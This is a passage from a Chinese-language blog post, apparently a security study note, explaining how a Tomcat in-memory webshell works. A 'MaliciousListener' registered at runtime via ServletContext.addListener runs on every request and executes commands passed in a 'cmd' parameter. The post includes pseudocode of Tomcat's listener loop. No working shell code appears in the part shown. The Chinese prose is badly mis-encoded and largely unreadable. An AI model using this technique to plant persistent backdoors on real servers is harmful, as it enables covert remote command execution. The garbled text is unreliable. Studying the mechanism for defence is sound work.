<code>MaliciousListener</code> æ·»åŠ åˆ°äº†</strong>â€œè­¦æŠ¥å™¨åˆ—è¡¨â€**ä¸­ã€‚</li></ul></li></ol><p><strong>Tomcat çš„å·¥ä½œï¼ˆé˜¶æ®µä¸‰ï¼‰ï¼š</strong> <strong>è¢«åŠ¨åœ°æ‰§è¡Œäº†ä¸€ä¸ªæ¥è‡ª <code>ServletContext</code> API çš„åˆæ³•å‘½ä»¤</strong>ã€‚å®ƒåœ¨<strong>è¿è¡Œæ—¶</strong>ä¸ºè‡ªå·±æ·»åŠ äº†ä¸€ä¸ªæ–°çš„ <code>ServletRequestListener</code>ã€‚</p><hr><h4 id=é˜¶æ®µå››å†…å­˜é©¬ä¸Šçº¿æ¶æ„è­¦æŠ¥å™¨å¼€å§‹å·¥ä½œ>é˜¶æ®µå››ï¼šå†…å­˜é©¬ä¸Šçº¿ï¼ˆâ€œæ¶æ„è­¦æŠ¥å™¨å¼€å§‹å·¥ä½œâ€ï¼‰<a hidden class=anchor aria-hidden=true href=#é˜¶æ®µå››å†…å­˜é©¬ä¸Šçº¿æ¶æ„è­¦æŠ¥å™¨å¼€å§‹å·¥ä½œ>#</a></h4><ol><li><strong>æ–°çš„æ­£å¸¸è¯·æ±‚è¿›æ¥</strong>ï¼šä»»ä½•ä¸€ä¸ªæ–°ç”¨æˆ·è®¿é—®ç½‘ç«™çš„ä»»ä½•é¡µé¢ï¼ˆæ¯”å¦‚é¦–é¡µï¼‰ã€‚</li><li><strong>Tomcat æ¥å¾…</strong>ï¼šTomcat æ”¶åˆ°è¯·æ±‚ã€‚</li><li><strong>Tomcat è§¦å‘â€œè­¦æŠ¥å™¨â€</strong>ï¼šåœ¨æŠŠè¯·æ±‚äº¤ç»™ Spring çš„ <code>DispatcherServlet</code> <strong>ä¹‹å‰</strong>ï¼ŒTomcat ä¼šæ£€æŸ¥å®ƒçš„â€œè­¦æŠ¥å™¨åˆ—è¡¨â€ï¼ˆ<code>ServletRequestListener</code>ï¼‰ã€‚</li><li><strong>æ¶æ„ä»£ç æ‰§è¡Œ</strong>ï¼š<ul><li>Tomcat å‘ç°ï¼šâ€œå’¦ï¼Œåˆ—è¡¨é‡Œæœ‰ä¸€ä¸ª <code>MaliciousListener</code>ï¼Œå®ƒè¦æ±‚åœ¨è¯·æ±‚åˆå§‹åŒ–æ—¶é€šçŸ¥å®ƒã€‚â€</li><li>Tomcat ç«‹å³è°ƒç”¨ <code>MaliciousListener</code> çš„ <code>requestInitialized</code> æ–¹æ³•ã€‚</li><li><strong>å†…å­˜é©¬è¢«è§¦å‘ï¼</strong></li><li>æ¶æ„ä»£ç å¼€å§‹æ£€æŸ¥è¯·æ±‚é‡Œæœ‰æ²¡æœ‰ <code>cmd</code> å‚æ•°ï¼Œå¦‚æœ æœ‰ï¼Œå°±æ¨¡æ‹Ÿæ‰§è¡Œå‘½ä»¤ã€‚</li></ul></li></ol><p><strong>Tomcat çš„å·¥ä½œï¼ˆé˜¶æ®µå››ï¼‰ï¼š</strong> å¿ å®åœ°æ‰§è¡Œäº†å®ƒ<strong>è‡ªå·±çš„</strong> <code>Listener</code> åˆ—è¡¨ä¸­çš„<strong>æ‰€æœ‰</strong> <code>Listener</code>â€”â€”åŒ…æ‹¬é‚£ä¸ªåˆšåˆšè¢«æ¶æ„æ³¨å…¥çš„ã€‚</p><p><strong>æ€»ç»“ï¼šTomcat åšäº†ä»€ä¹ˆï¼Ÿ</strong></p><ul><li><strong>å¯åŠ¨æ—¶</strong>ï¼šTomcat æä¾›äº† <strong><code>ServletContext</code>ï¼ˆâ€œæ€»æ§åˆ¶å®¤â€ï¼‰</strong> è¿™ä¸ªæ ¸å¿ƒæœºåˆ¶ã€‚</li><li><strong>è¿è¡Œæ—¶</strong>ï¼š<ol><li>Tomcat æŠŠæ‰€æœ‰è¯·æ±‚éƒ½â€œå¤–åŒ…â€ç»™äº† Spring çš„ <code>DispatcherServlet</code>ã€‚</li><li>Tomcat <strong>è¢«åŠ¨åœ°</strong>ã€<strong>ç›´æ¥åœ°</strong> æ¥æ”¶äº† <code>context.addListener()</code> è¿™ä¸ª<strong>åº•å±‚ API</strong> å‘½ä»¤ï¼Œå¹¶æ›´æ–°äº†è‡ªå·±çš„â€œè­¦æŠ¥å™¨åˆ—è¡¨â€ã€‚</li><li>Tomcat åœ¨å¤„ç†<strong>åç»­æ‰€æœ‰è¯·æ±‚</strong>æ—¶ï¼Œå¿ å®åœ°è°ƒç”¨äº†é‚£ä¸ª<strong>è¢«æ¶æ„æ·»åŠ </strong>çš„ <code>Listener</code>ã€‚</li></ol></li></ul><h3 id=æˆ‘çš„ç–‘é—®ç›‘å¬æ¨¡å¼èƒŒåçš„é€»è¾‘>æˆ‘çš„ç–‘é—®ï¼šç›‘å¬æ¨¡å¼èƒŒåçš„é€»è¾‘<a hidden class=anchor aria-hidden=true href=#æˆ‘çš„ç–‘é—®ç›‘å¬æ¨¡å¼èƒŒåçš„é€»è¾‘>#</a></h3><p>åœ¨ä½ ä¹‹å‰çš„ä¾‹å­ï¼ˆ<code>ServletRequestListener</code>ï¼‰ä¸­ï¼Œè§’è‰²æ˜¯è¿™æ ·åˆ†é…çš„ï¼š</p><ul><li><p><strong>è°æ˜¯äº‹ä»¶æºï¼ˆEvent Source / Subjectï¼‰ï¼Ÿ</strong></p><ul><li><strong>Tomcat å®¹å™¨</strong>ã€‚æ›´å…·ä½“åœ°è¯´ï¼Œæ˜¯ Tomcat å†…éƒ¨è´Ÿè´£<strong>å¤„ç† HTTP è¯·æ±‚ç”Ÿå‘½å‘¨æœŸ</strong>çš„æ ¸å¿ƒç»„ä»¶ï¼ˆä¾‹å¦‚ï¼Œåœ¨ Tomcat çš„ Catalina å¼•æ“ä¸­ï¼Œå¯èƒ½æ˜¯æŸä¸ª <code>Valve</code> æˆ– <code>Adapter</code>ï¼‰ã€‚</li><li><strong>é€šä¿—è§£é‡Š</strong>ï¼šè¿™å°±æ˜¯é‚£ä¸ªâ€œå¤§è€æ¿â€ï¼Œå®ƒå†³å®šäº†ä»€ä¹ˆæ—¶å€™â€œä¸€ä»¶å¤§äº‹â€å‘ç”Ÿäº†ï¼ˆæ¯”å¦‚â€œæ–°è¯·æ±‚æ¥äº†ï¼â€ï¼‰ã€‚</li></ul></li><li><p><strong>è°æ˜¯ç›‘å¬å™¨ï¼ˆListener / Observerï¼‰ï¼Ÿ</strong></p><ul><li><strong><code>MaliciousListener</code> ç±»</strong>ï¼ˆä»¥åŠæ‰€æœ‰å…¶ä»–å®ç°äº† <code>ServletRequestListener</code> æ¥å£çš„ç±»ï¼‰ã€‚</li><li><strong>é€šä¿—è§£é‡Š</strong>ï¼šè¿™å°±æ˜¯â€œè®¢é˜…è€…â€æˆ–â€œè§‚å¯Ÿè€…â€ã€‚ä½ ï¼ˆé€šè¿‡ <code>MaliciousListener</code>ï¼‰å‘Šè¯‰â€œå¤§è€æ¿â€ï¼šâ€œæˆ‘å¯¹â€˜æ–°è¯·æ±‚æ¥äº†â€™è¿™ä»¶äº‹å¾ˆæ„Ÿå…´è¶£ï¼Œå‘ç”Ÿçš„æ—¶å€™è¯·åŠ¡å¿…é€šçŸ¥æˆ‘ã€‚â€</li></ul></li><li><p><strong>è°æ˜¯â€œäº‹ä»¶â€æœ¬èº«ï¼ˆEvent Objectï¼‰ï¼Ÿ</strong></p><ul><li><strong><code>ServletRequestEvent</code> å¯¹è±¡</strong>ã€‚</li><li><strong>é€šä¿—è§£é‡Š</strong>ï¼šè¿™å°±æ˜¯â€œé€šçŸ¥â€æœ¬èº«ã€‚å½“â€œå¤§è€æ¿â€é€šçŸ¥ä½ æ—¶ï¼Œå®ƒä¸ä¼šç©ºæ‰‹æ¥ï¼Œå®ƒä¼šé€’ç»™ä½ ä¸€å¼ â€œäº‹ä»¶è¯¦æƒ…å¡â€ï¼ˆ<code>ServletRequestEvent</code>ï¼‰ï¼Œä¸Šé¢å†™ç€ï¼šâ€œæ–°è¯·æ±‚æ¥äº†ï¼Œè¿™æ˜¯å®ƒçš„è¯¦ç»†ä¿¡æ¯ï¼ˆ<code>getServletRequest()</code>ï¼‰ã€‚â€</li></ul></li></ul><hr><p>ğŸ§  <strong>Tomcat çš„å†…éƒ¨é€»è¾‘ï¼šå®ƒâ€œæ€ä¹ˆçŸ¥é“è¦æ£€æŸ¥â€ï¼Ÿ</strong></p><p>Tomcat å¹¶ä¸æ˜¯åœ¨â€œæ£€æŸ¥â€å®ƒæ˜¯å¦åº”è¯¥è¿™æ ·åšï¼Œè€Œæ˜¯**â€œå®ƒè¢«ç¼–ç¨‹ï¼ˆç¡¬ç¼–ç ï¼‰ä¸ºå¿…é¡»è¿™æ ·åšâ€**ã€‚</p><p>è¿™å¥—æœºåˆ¶æ˜¯ <strong>Java Servlet è§„èŒƒ</strong>ï¼ˆJSR-340/4.0 ç­‰ï¼‰<strong>å¼ºåˆ¶è§„å®š</strong>çš„ã€‚æ‰€æœ‰ Web å®¹å™¨ï¼ˆTomcat, Jetty, Undertow&mldr;ï¼‰éƒ½å¿…é¡»å®ç°è¿™ä¸ªé€»è¾‘ã€‚</p><p>æˆ‘ä»¬æ¥æ¨¡æ‹Ÿä¸€ä¸‹ Tomcat å†…éƒ¨<strong>æœ€ç®€åŒ–</strong>çš„å·¥ä½œæµç¨‹ï¼š</p><p><strong>ç¬¬ä¸€æ­¥ï¼šæ³¨å†Œï¼ˆâ€œç™»è®°è®¢é˜…è€…â€ï¼‰</strong></p><p>å½“ä½ è°ƒç”¨ <code>context.addListener(MaliciousListener.class)</code> æ—¶ï¼š</p><ul><li><strong>Tomcat å†…éƒ¨</strong>ï¼š<code>ServletContext</code> å¯¹è±¡ï¼ˆTomcat ç§°ä¹‹ä¸º <code>StandardContext</code>ï¼‰ä¼šç»´æŠ¤<strong>å¥½å‡ ä¸ªåˆ—è¡¨</strong>ã€‚</li><li>å®ƒä¼šæ‰¾åˆ°ä¸€ä¸ªä¸“é—¨å­˜æ”¾ <code>ServletRequestListener</code> çš„åˆ—è¡¨ï¼ˆæ¯”å¦‚å« <code>applicationRequestListeners</code>ï¼‰ã€‚</li><li>å®ƒæŠŠä½ <strong>æ–°çš„ <code>MaliciousListener</code> å®ä¾‹</strong>æ·»åŠ åˆ°äº†è¿™ä¸ªåˆ—è¡¨ä¸­ã€‚</li></ul><p><strong>åŸç†</strong>ï¼š<code>ServletContext</code> å°±åƒä¸€ä¸ªâ€œè®¢é˜…ç®¡ç†ä¸­å¿ƒâ€ï¼Œå®ƒæŠŠæ‰€æœ‰â€œè®¢é˜…è€…â€ï¼ˆListenersï¼‰æŒ‰ç…§ä»–ä»¬æ„Ÿå…´è¶£çš„â€œé¢‘é“â€ï¼ˆäº‹ä»¶ç±»å‹ï¼‰åˆ†é—¨åˆ«ç±»åœ°æ”¾å¥½ã€‚</p><p><strong>ç¬¬äºŒæ­¥ï¼šè§¦å‘ï¼ˆâ€œäº‹ä»¶å‘ç”Ÿï¼â€ï¼‰</strong></p><ol><li><strong>æ–° HTTP è¯·æ±‚åˆ°è¾¾</strong>ï¼šä¸€ä¸ªç½‘ç»œè¿æ¥è¿›æ¥äº†ã€‚</li><li><strong>Tomcat æ ¸å¿ƒç»„ä»¶</strong>ï¼ˆæ¯”å¦‚ <code>CoyoteAdapter</code>ï¼‰æ¥æ”¶åˆ°è¿™ä¸ªè¯·æ±‚ï¼Œå¹¶å‡†å¤‡å¼€å§‹å¤„ç†å®ƒã€‚</li><li><strong>åœ¨å¤„ç†ä¸šåŠ¡é€»è¾‘ï¼ˆå¦‚è°ƒç”¨ Spring çš„ <code>DispatcherServlet</code>ï¼‰ä¹‹å‰</strong>ï¼Œè¿™ä¸ªç»„ä»¶çš„ä»£ç é‡Œ<strong>å†™æ­»äº†</strong>å¦‚ä¸‹é€»è¾‘ï¼š</li></ol><pre tabindex=0><code>// --------------------------------------------------------------------
// è¿™æ˜¯ä¸€ä¸ªã€ä¼ªä»£ç ã€‘ï¼Œæ¨¡æ‹Ÿ Tomcat å†…éƒ¨çš„ requestProcess() æ–¹æ³•

// 1. ä» &#34;è®¢é˜…ç®¡ç†ä¸­å¿ƒ&#34; (ServletContext) æ‹¿åˆ°æ‰€æœ‰â€œè¯·æ±‚è®¢é˜…è€…â€çš„åˆ—è¡¨
List&lt;ServletRequestListener&gt; listeners = context.getApplicationRequestListeners();

// 2. å‡†å¤‡â€œäº‹ä»¶è¯¦æƒ…å¡â€
ServletRequestEvent event = new ServletRequestEvent(context, request);

// 3. ã€å…³é”®ã€‘Tomcat å¿…é¡»ï¼å¿…é¡»ï¼å¿…é¡»ï¼
//    åœ¨å¤„ç†è¯·æ±‚ä¹‹å‰ï¼Œé€šçŸ¥æ‰€æœ‰è®¢é˜…è€…
if (listeners.size() &gt; 0) {
    for (ServletRequestListener listener : listeners) {
        // &#34;å¤§è€æ¿&#34; æ­£åœ¨æŒ¨ä¸ªæ‰“ç”µè¯
        // è¿™å°±æ˜¯ä½ å†™çš„ requestInitialized() æ–¹æ³•è¢«è°ƒç”¨çš„åœ°æ–¹ï¼
        listener.requestInitialized(event);
    }
}

// 4. ã€é€šçŸ¥å®Œæ¯•ã€‘
//    ç°åœ¨æ‰çœŸæ­£å¼€å§‹å¤„ç†è¯·æ±‚ï¼Œä¾‹å¦‚äº¤ç»™ Spring çš„ DispatcherServlet
doActualRequestProcessing(request, response);

// 5. ã€è¯·æ±‚å¤„ç†å®Œæ¯•ã€‘
//    Tomcat åˆå¿…é¡»ï¼å¿…é¡»ï¼å¿…é¡»ï¼
//    é€šçŸ¥æ‰€æœ‰è®¢é˜…è€…â€œè¯·æ±‚é”€æ¯äº†â€
if (listeners.size() &gt; 0) {
    // ... (çœç•¥) ...
    for (ServletRequestListener listener : listeners) {
        listener.requestDestroyed(event);
    }
}
// --------------------------------------------------------------------
</code></pre><p><code>Listener.requestInitialized(event)</code> è¿™ä¸€è¡Œä»£ç ï¼Œå°±æ˜¯æ•´ä¸ª<strong>è§‚å¯Ÿè€…æ¨¡å¼</strong>ä¸­â€œ<strong>é€šçŸ¥</strong>â€è¿™ä¸ªåŠ¨ä½œå‘ç”Ÿçš„<strong>ç¡®åˆ‡æ—¶åˆ»</strong>ã€‚</p><ul><li><strong><code>listener</code></strong>ï¼šå°±æ˜¯ä½ çš„ <code>MaliciousListener</code> å¯¹è±¡ï¼ˆè§‚å¯Ÿè€…ï¼‰ã€‚</li><li><strong><code>requestInitialized(event)</code></strong>ï¼šå°±æ˜¯ Tomcatï¼ˆäº‹ä»¶æºï¼‰åœ¨è°ƒç”¨ä½ ï¼ˆè§‚å¯Ÿè€…ï¼‰åœ¨â€œè®¢é˜…â€æ—¶æä¾›çš„<strong>å›è°ƒæ–¹æ³•</strong>ã€‚</li><li><strong><code>event</code></strong>ï¼šå°±æ˜¯ Tomcat ä¼ é€’ç»™ä½ çš„â€œäº‹ä»¶è¯¦æƒ…å¡â€ï¼Œé‡Œé¢åŒ…å«äº† <code>ServletRequest</code> å¯¹è±¡ï¼Œè®©ä½ å¯ä»¥è·å–åˆ°è¯·æ±‚å‚æ•°ï¼ˆæ¯”å¦‚ <code>cmd</code>ï¼‰ã€‚</li></ul><p>â€‹ åœ¨ Tomcat çš„ <code>for</code> å¾ªç¯ä¸­ï¼Œå½“å®ƒéå†åˆ°ä½ çš„ <code>MaliciousListener</code> æ—¶ï¼Œå°±ä¼šæ‰§è¡Œè¿™ä¸€è¡Œã€‚<strong>è¿™å°±æ˜¯ä½ æ‰€æœ‰æ¶æ„ä»£ç çš„æ‰§è¡Œå…¥å£ç‚¹ã€‚</strong></p><p>ä¸€æ—¦è¿™ä¸ªæ–¹æ³•è¢«è°ƒç”¨ï¼Œä½ çš„ä»£ç å°±å¼€å§‹åœ¨ Tomcat çš„ä¸»å·¥ä½œçº¿ç¨‹ ä¸Šè¿è¡Œäº†ã€‚</p><p>â€‹ Tomcatï¼ˆäº‹ä»¶æºï¼‰å®Œæˆäº†å®ƒåœ¨è§„èŒƒä¸­å¿…é¡»æ‰§è¡Œçš„å›ºå®šæµç¨‹ï¼ˆâ€œ<strong>å˜¿ï¼Œæˆ‘è¦é€šçŸ¥æ‰€æœ‰å¯¹â€˜è¯·æ±‚åˆå§‹åŒ–â€™æ„Ÿå…´è¶£çš„è®¢é˜…è€…äº†</strong>â€ï¼‰ï¼Œç„¶åæŠŠæ‰§è¡Œæƒ**â€œå›è°ƒâ€**ç»™äº†ä½ çš„ <code>Listener</code>ï¼ˆè§‚å¯Ÿè€…ï¼‰ã€‚</p><p>â€‹ åœ¨è¿™ä¸ªæ–¹æ³•ï¼ˆ<code>requestInitialized</code>ï¼‰æ‰§è¡ŒæœŸé—´ï¼ŒTomcat ä¼š**â€œç­‰å¾…â€**ä½ çš„ä»£ç æ‰§è¡Œå®Œæ¯•ï¼Œç„¶åå†å»å¤„ç†è¯·æ±‚çš„ä¸‹ä¸€æ­¥ï¼ˆæ¯”å¦‚äº¤ç»™ Spring çš„ <code>DispatcherServlet</code>ï¼‰ã€‚</p><p>â€‹ è¿™å°±æ˜¯ä¸ºä»€ä¹ˆè¿™ä¸ªâ€œæ³¨å…¥ç‚¹â€å¦‚æ­¤å¼ºå¤§ï¼ˆä»åŠŸèƒ½ä¸Šè®²ï¼‰å’Œå±é™©ï¼ˆä»å®‰å…¨ä¸Šè®²ï¼‰çš„åŸå› â€”â€”<strong>å®ƒè®©ä½ åœ¨æ•´ä¸ª Web æµç¨‹çš„æœ€å‰ç«¯ï¼Œè·å¾—äº†ä»£ç æ‰§è¡Œçš„æœºä¼š</strong>ã€‚</p></div><footer class=post-footer><ul class=post-tags></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://ljj1992.fun/>starå¾çš„åšå®¢</a></span> Â·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");if(menu){const e=localStorage.getItem("menu-scroll-position");e&&(menu.scrollLeft=parseInt(e,10)),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}}document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{const e=document.querySelector("html");e.dataset.theme==="dark"?(e.dataset.theme="light",localStorage.setItem("pref-theme","light")):(e.dataset.theme="dark",localStorage.setItem("pref-theme","dark"))})</script></body></html>